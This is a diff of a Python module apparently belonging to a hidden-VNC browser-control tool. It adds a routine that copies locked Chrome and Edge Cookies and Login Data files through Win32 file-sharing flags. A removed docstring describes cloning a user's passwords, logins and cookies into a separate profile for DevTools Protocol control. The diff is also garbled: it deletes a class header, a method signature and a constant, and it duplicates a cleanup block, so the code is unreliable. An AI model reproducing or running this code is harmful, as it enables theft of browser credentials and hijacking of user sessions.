@@ -17,7 +17,45 @@ from typing import Optional, Dict, Any, List, Callable
 logger = logging.getLogger("hvnc.cdp_controller")
 
 DEFAULT_CHROME_PORT = 9222
-DEFAULT_EDGE_PORT = 9223
+def safe_copy_locked_file(src: str, dst: str):
+    """
+    Copies a file even if it is currently locked by a running process (like Chrome/Edge Cookies or Login Data),
+    using Win32 CreateFileW with FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE.
+    """
+    try:
+        import shutil
+        shutil.copy2(src, dst)
+        return
+    except Exception:
+        pass
+
+    try:
+        import ctypes
+        from ctypes import wintypes
+        GENERIC_READ = 0x80000000
+        FILE_SHARE_READ = 0x00000001
+        FILE_SHARE_WRITE = 0x00000002
+        FILE_SHARE_DELETE = 0x00000004
+        OPEN_EXISTING = 3
+        FILE_ATTRIBUTE_NORMAL = 0x80
+
+        handle = ctypes.windll.kernel32.CreateFileW(
+            src, GENERIC_READ,
+            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+            None, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None
+        )
+        if handle and handle != -1 and handle != 0xFFFFFFFF:
+            data = bytearray()
+            buf = ctypes.create_string_buffer(65536)
+            read_bytes = wintypes.DWORD()
+            while ctypes.windll.kernel32.ReadFile(handle, buf, 65536, ctypes.byref(read_bytes), None) and read_bytes.value > 0:
+                data.extend(buf.raw[:read_bytes.value])
+            ctypes.windll.kernel32.CloseHandle(handle)
+            if data:
+                with open(dst, "wb") as f:
+                    f.write(data)
+    except Exception as e:
+        logger.debug(f"safe_copy_locked_file error on {src}: {e}")
 
 
 class CDPController:
@@ -111,76 +149,15 @@ class CDPController:
             user_data = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
             cdp_data = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\TRMM_CDP_Isolated")
 
-        os.makedirs(cdp_data, exist_ok=True)
-        if not os.path.isdir(user_data):
-            return cdp_data
-
-def safe_copy_locked_file(src: str, dst: str):
-    """
-    Copies a file even if it is currently locked by a running process (like Chrome/Edge Cookies or Login Data),
-    using Win32 CreateFileW with FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE.
-    """
-    try:
-        shutil.copy2(src, dst)
-        return
-    except Exception:
-        pass
-
-    try:
-        GENERIC_READ = 0x80000000
-        FILE_SHARE_READ = 0x00000001
-        FILE_SHARE_WRITE = 0x00000002
-        FILE_SHARE_DELETE = 0x00000004
-        OPEN_EXISTING = 3
-        FILE_ATTRIBUTE_NORMAL = 0x80
-
-        handle = ctypes.windll.kernel32.CreateFileW(
-            src, GENERIC_READ,
-            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
-            None, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None
-        )
-        if handle and handle != -1 and handle != 0xFFFFFFFF:
-            data = bytearray()
-            buf = ctypes.create_string_buffer(65536)
-            read_bytes = wintypes.DWORD()
-            while ctypes.windll.kernel32.ReadFile(handle, buf, 65536, ctypes.byref(read_bytes), None) and read_bytes.value > 0:
-                data.extend(buf.raw[:read_bytes.value])
-            ctypes.windll.kernel32.CloseHandle(handle)
-            if data:
-                with open(dst, "wb") as f:
-                    f.write(data)
-    except Exception as e:
-        logger.debug(f"safe_copy_locked_file error on {src}: {e}")
-
-class CDPController:
-    """Controls Google Chrome or Microsoft Edge via Chrome DevTools Protocol (CDP)."""
-
-    def __init__(self, port: int = 9222, host: str = "127.0.0.1"):
-        self.port = port
-        self.host = host
-        self.base_url = f"http://{host}:{port}"
-        self.ws_url = None
-        self.active_tab_id = None
-        self.ws_connection = None
-
-    @staticmethod
-    def get_cdp_junction_path(browser: str = "chrome") -> str:
-        """
-        Returns a cloned isolated profile directory for CDP debugging sessions.
-        Deep-clones the user's authentic profile data (passwords, logins, cookies, bookmarks,
-        history, preferences, accounts, extensions) into an isolated directory
-        while excluding Chromium's process singleton locks (SingletonLock, Lockfile).
-        """
-        if browser == "edge":
-            user_data = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
-            cdp_data = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\TRMM_CDP_Isolated")
-        else:
-            user_data = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
-            cdp_data = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\TRMM_CDP_Isolated")
-
-        os.makedirs(cdp_data, exist_ok=True)
-        if not os.path.isdir(user_data):
-            return cdp_data
+        # 1. Clean any stale singleton locks in cdp_data
+        for root, dirs, files in os.walk(cdp_data):
+            for fname in files:
+                lower = fname.lower()
+                if any(x in lower for x in ["singleton", "lock", "journal", "wal", "current session", "current tabs"]):
+                    try:
+                        os.remove(os.path.join(root, fname))
+                    except Exception:
+                        pass
 
         # 1. Clean any stale singleton locks in cdp_data
         for root, dirs, files in os.walk(cdp_data):
